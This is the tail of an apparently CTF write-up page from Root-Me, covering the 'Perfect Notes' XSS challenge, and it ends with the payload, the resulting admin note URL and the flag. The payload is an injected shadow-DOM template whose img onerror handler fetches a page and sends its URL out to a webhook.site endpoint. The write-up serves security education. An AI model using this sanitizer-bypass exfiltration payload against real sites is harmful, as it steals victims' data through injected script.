<h2 id="-flag">üéâ Flag</h2>
<p>Payload:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;&lt;</span><span class="nt">template</span> <span class="na">shadowroot</span><span class="o">=</span><span class="s">&#34;open&#34;</span><span class="p">&gt;&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&#34;fetch(&#39;/&#39;).then(d =&gt; d.url).then((url) =&gt; { fetch(`https://webhook.site/&lt;your-webhook&gt;?url=${url}`) })&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>Waiting for few minutes give us: <code>http://ctf10k.root-me.org:6004/notes/bb9ccf6f-2ec7-4b14-8a6c-6df064ae18a7</code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/writeups/perfect_notes/admin.png"
        data-srcset="/assets/images/writeups/perfect_notes/admin.png, /assets/images/writeups/perfect_notes/admin.png 1.5x, /assets/images/writeups/perfect_notes/admin.png 2x"
        data-sizes="auto"
        alt="/assets/images/writeups/perfect_notes/admin.png"
        title="admin.png" /></p>
<p>Flag: <code>RM{T4k3_C4R3_0f_Sh4d0w_D0M_Wh1T_S4n1T4Z3R}</code> üéâ</p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2023-03-02</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://blog.root-me.org/posts/writeup_ctf10k_perfect_notes/" data-title="Writeup - Root-Me CTF 10k - Perfect Notes" data-via="rootme_org" data-hashtags="writeups,CTF10k,DOM Clobbering,Challenge,XSS"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://blog.root-me.org/posts/writeup_ctf10k_perfect_notes/" data-hashtag="writeups"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://blog.root-me.org/posts/writeup_ctf10k_perfect_notes/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/writeups/">writeups</a>,&nbsp;<a href="/tags/ctf10k/">CTF10k</a>,&nbsp;<a href="/tags/dom-clobbering/">DOM Clobbering</a>,&nbsp;<a href="/tags/challenge/">Challenge</a>,&nbsp;<a href="/tags/xss/">xss</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/posts/writeup_ctf10k_proxifier/" class="prev" rel="prev" title="Writeup - Root-Me CTF 10k - Proxifier"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Writeup - Root-Me CTF 10k - Proxifier</a>
            <a href="/posts/how-to-start/" class="next" rel="next" title="How to start in cybersecurity">How to start in cybersecurity<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://root-me.org" target="_blank">Root-Me</a></span>&nbsp;|&nbsp;<span class="license">contact@root-me.org | <a href='/privacy/'>Privacy</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
